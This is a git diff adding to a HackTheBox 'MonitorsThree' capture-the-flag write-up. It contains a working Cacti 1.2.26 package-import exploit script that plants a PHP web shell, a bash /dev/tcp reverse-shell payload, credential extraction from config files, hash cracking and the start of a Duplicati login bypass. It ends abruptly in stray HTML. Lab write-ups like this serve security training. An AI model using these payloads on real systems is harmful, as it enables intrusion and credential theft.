@@ -58,7 +58,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Taking a look at `http://monitorsthree.htb` we get a web app for a networking solutions firm. Looking around we found a login page at `http://monitorsthree.htb/login.ph`p with a reset password feature, trying some default creds such as admin:admin and root:root won’t be able to help us much so we decided to run an SQLMap on the form and see if it’s vulnerable to SQLi. Capturing a request using Burpsuite we gave it to SQLMap to try some SQLi payloads it didn’t work as intended but trying the same technique on `/forgot_password`.php it worked, the form was vulnerable to SQLi!
+Taking a look at `http://monitorsthree.htb` we get a web app for a networking solutions firm. Looking around we found a login page at `http://monitorsthree.htb/login.php` with a reset password feature, trying some default creds such as admin:admin and root:root won’t be able to help us much so we decided to run an SQLMap on the form and see if it’s vulnerable to SQLi. Capturing a request using Burpsuite we gave it to SQLMap to try some SQLi payloads it didn’t work as intended but trying the same technique on `/forgot_password`.php it worked, the form was vulnerable to SQLi!
 
 > ⚠️As it’s a time-based blind it will take some time to run and retrieve useful information.
 
@@ -173,8 +173,259 @@ Adding that to our `/etc/hosts` and having a look at it we get another form, try
 
 ![/etc/hosts](02.png){: width="1200" height="800" }
 
+Once logged in, we could see the current version of cacti an open-source, web-based network monitoring which is Version `1.2.26` .
+
+![/etc/hosts](03.png){: width="1200" height="800" }
+
+Googline Cacti 1.2.26 exploit we found a [Github Page](https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) mentioning an RCE vulnerability with the Import Packages feature as the web app is blindly trusting the filename and the content provided within the XML. Copying the POC provided and tweaking it a bit we got the script that will generate for us the malicious package to upload.
+
+```console
+<?php
+
+$xmldata = <<<XML
+<xml>
+   <files>
+       <file>
+           <name>resource/test.php</name>
+           <data>%s</data>
+           <filesignature>%s</filesignature>
+       </file>
+   </files>
+   <publickey>%s</publickey>
+   <signature></signature>
+</xml>
+XML;
+
+$filedata = "<?php system(\$_GET['cmd']); ?>";
+$keypair = openssl_pkey_new();
+$public_key = openssl_pkey_get_details($keypair)["key"];
+openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
+
+$data = sprintf(
+    $xmldata,
+    base64_encode($filedata),
+    base64_encode($filesignature),
+    base64_encode($public_key)
+);
+
+openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
+$data = str_replace(
+    "<signature></signature>",
+    "<signature>" . base64_encode($signature) . "</signature>",
+    $data
+);
+
+file_put_contents("test.xml", $data);
+system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");
+
+?>
+```
+
+So basically the script will create a test.xml.gz file for us that contains the xml script which will then be uploaded with a malicious GET parameter, `<?php system(\$_GET['cmd']); ?>` , that will get the RCE for us.
+
+> ⚠️Note: the script will end up being deleted after a short amount of time so we have to upload and then run the reverse shell command as soon as possible.
+
+Running the script using PHP we get the desired file.
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/monitorsthree]
+└─$ php exploit.php       
+                                                                                                      
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/monitorsthree]
+└─$ ls
+exploit.php  test.xml.gz
+```
+
+Going to Import Packages at `http://cacti.monitorsthree.htb/cacti/package_import.php` we select the file we generated and we can see that the file will be uploaded at `/cacti/resource/test.php` , having that in mind, we prepare the URL to GET, `http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.191/9001 0>&1"` . We now need to URL-encode it, `http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=/bin/bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.191/9001+0>%261`"
+
+![/etc/hosts](04.png){: width="1200" height="800" }
+
+Setting up a listener and sending that `GET` request we get our reverse shell!
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ nc -lnvp 9001  
+listening on [any] 9001 ...
+connect to [10.10.14.191] from (UNKNOWN) [10.129.200.79] 42544
+bash: cannot set terminal process group (1152): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@monitorsthree:~/html/cacti/resource$ python3 -c "import pty;pty.spawn('/bin/bash')"
+<rce$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@monitorsthree:~/html/cacti/resource$ export TERM=xterm
+export TERM=xterm
+www-data@monitorsthree:~/html/cacti/resource$ ^Z
+zsh: suspended  nc -lnvp 9001
+                                                                                                                          
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ stty raw -echo; fg             
+[1]  + continued  nc -lnvp 9001
+
+www-data@monitorsthree:~/html/cacti/resource$
+```
+## User Pivoting
+
+Once in we looked for the user on the box and we got 2 active users, `root` and `marcus`.
+
+```console
+www-data@monitorsthree:~/html/cacti/resource$ grep 'sh$' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
+```
+
+Taking a look at the cacti config file we get the cacti database credentials.
 
 
+```console
+www-data@monitorsthree:~/html/cacti/include$ cat config.php
+<?php
+
+[...]
+
+$database_type     = 'mysql';
+$database_default  = 'cacti';
+$database_hostname = 'localhost';
+$database_username = 'cactiuser';
+$database_password = '[REDACTED]';
+$database_port     = '3306';
+$database_retries  = 5;
+$database_ssl      = false;
+$database_ssl_key  = '';
+$database_ssl_cert = '';
+$database_ssl_ca   = '';
+$database_persist  = false;
+
+/**
+ * When the cacti server is a remote poller, then these entries point to
+ * the main cacti server. Otherwise, these variables have no use and
+ * must remain commented out.
+ */
+ ```
+
+ Looking into the database, we found `marcus` hash.
+
+```console
+www-data@monitorsthree:~/html/cacti/include$ mysql -u cactiuser -p -D cacti
+Enter password: 
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 924
+Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+[...]
+
+MariaDB [cacti]> select username, password from user_auth;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$tjPSsSP6Uo[REDACTED]                                  |
+| guest    | $2y$10$SO8woUvjSF[REDACTED]                                  |
+| marcus   | $2y$10$Fq8wGXvlM3[REDACTED]                                  |
++----------+--------------------------------------------------------------+
+3 rows in set (0.000 sec)
+```
+
+Cracking marcus’ hash we were able to retrieve it and connect to the account using.
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ john marcus.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+No password hashes left to crack (see FAQ)
+                                                                                                                          
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ john marcus.hash -show                                       
+?:[REDACTED]
+
+1 password hash cracked, 0 left
+```
+Setting our public key in the account, we were able to get a more stable shell.
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ ssh marcus@monitorsthree.htb   
+Last login: Tue Aug 20 11:34:00 2024
+marcus@monitorsthree:~$ ls
+user.txt
+marcus@monitorsthree:~$ cat user.txt 
+[REDACTED]
+```
+
+## Privilege Escalation
+Taking a look at the open ports on the machine we get port 8200 open locally.
+
+```console
+marcus@monitorsthree:~$ ss -tlnp
+State         Recv-Q        Send-Q               Local Address:Port                Peer Address:Port       Process        
+LISTEN        0             511                        0.0.0.0:80                       0.0.0.0:*                         
+LISTEN        0             128                        0.0.0.0:22                       0.0.0.0:*                         
+LISTEN        0             70                       127.0.0.1:3306                     0.0.0.0:*                         
+LISTEN        0             4096                 127.0.0.53%lo:53                       0.0.0.0:*                         
+LISTEN        0             4096                     127.0.0.1:37299                    0.0.0.0:*                         
+LISTEN        0             4096                     127.0.0.1:8200                     0.0.0.0:*                         
+LISTEN        0             500                        0.0.0.0:8084                     0.0.0.0:*                         
+LISTEN        0             511                           [::]:80                          [::]:*                         
+LISTEN        0             128                           [::]:22                          [::]:*
+```
+
+Having ssh open we port forwarded 8200 on our local machine in order to investigate it more.
+
+We added the flags `-N` and `-f` to not open a session.
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ ssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -N -f
+```
+
+Curling our localhost on port 8200 we can see that it’s a web server.
+
+```console
+┌──(kali㉿kali)-[~/Desktop/HackTheBox/MonitorsThree]
+└─$ curl -v localhost:8200
+* Host localhost:8200 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8200...
+* Connected to localhost (::1) port 8200
+> GET / HTTP/1.1
+> Host: localhost:8200
+> User-Agent: curl/8.7.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 302 Redirect
+< location: /login.html
+< Date: Mon, 26 Aug 2024 19:27:48 GMT
+< Content-Length: 0
+< Content-Type: 
+< Server: Tiny WebServer
+< Connection: close
+< Set-Cookie: xsrf-token=kv3U7L4YlbJiZZRHXvWYKzngmmd%2Bt2EzMKdumoIhU28%3D; expires=Mon, 26 Aug 2024 19:37:48 GMT;path=/; 
+< 
+* Closing connection
+```
+
+Taking a look at the web server we got a login pagin for Duplicati a backup client that securely stores encrypted, incremental, compressed remote backups of local files on cloud storage services and remote file servers.
+
+![/etc/hosts](05.png){: width="1200" height="800" }
+
+Googling “`Duplicati Login Bypass`” we found a [Medium Post](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) mentioning a technique to bypass duplicati login.
+
+So here are the steps we’ll be doing, to summerize.
+
+- Retrieving the Server-Passphrase (base64)
+- Decrypting it from Base64 then convert it to Hex
+- Capturing the Nonce session value
+- Setting up the noncedpwd variable in the console and retrieving the outputted value
+- URL-encode the outputted value and submit it as the password
+
+So, for the server-passphrase, we can find it in `/opt/duplicati/config/Duplicati-server.sqlite` , running sqlitebrowser on the sqlite file will get us what we need.
 <html lang="en">
 <head>
   <meta charset="UTF-8">
